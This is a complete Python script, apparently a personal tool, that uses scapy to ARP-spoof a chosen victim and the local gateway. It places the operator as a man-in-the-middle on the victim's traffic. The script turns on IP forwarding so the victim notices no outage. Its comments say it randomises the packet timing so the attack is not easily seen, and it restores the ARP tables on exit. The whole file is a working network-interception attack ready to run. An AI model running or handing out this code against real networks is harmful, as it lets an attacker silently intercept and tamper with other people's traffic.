import sys
import os
import time
import random
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.sendrecv import send
import argparse

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # enable IP forwarding

def restore(targetIP, targetMAC, sourceIP, sourceMAC): #restore function for after CTRL+C is pressed/ action is ended, then it restores the network to the original state as to not make a DoS when our program stops working as a MITM
    packet = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=sourceIP, hwsrc=sourceMAC)
    send(packet, count=5, verbose=False)

parser = argparse.ArgumentParser(description="ARP spoof program")
parser.add_argument("victimIP", help="Victim/Target IP address")
parser.add_argument("userIface", help="Users interface used to connect to the network")

args = parser.parse_args()
if len(sys.argv) != 3:
    print("Error! Usage: sudo python3 aprSpoof.py <victimIP> <userInterface>")
    sys.exit(1)

gatewayIP = conf.route.route("0.0.0.0")[2] # getting the gateway IP so we can continue the service so as if to not make it a DoS attack
gatewayMAC = getmacbyip(gatewayIP)
victimMAC = getmacbyip(args.victimIP)
selfMAC = get_if_hwaddr(args.userIface)

if not gatewayMAC:
    print("Error! Cannot find MAC for gateway")
    sys.exit(1)
if not victimMAC:
    print("Error! Cannot find MAC for victim")
    sys.exit(1)

def spoof(targetIP, targetMAC, spoofIP):
    packet = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    send(packet, verbose=False)


try:
    while True:
        spoof(args.victimIP, victimMAC, gatewayIP) # sends to the victim that we are the gateway
        spoof(gatewayIP, gatewayMAC, args.victimIP) # sends to the gateway that we are the victim

        time.sleep(random.uniform(1.0,2.0)) # randomise the sending time so it's not easily seeable
except KeyboardInterrupt:
    print("\nRestoring original ARP caches")
    restore(args.victimIP, victimMAC, gatewayIP, gatewayMAC)
    restore(gatewayIP, gatewayMAC, args.victimIP, victimMAC)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("Restored! Shutting down...")


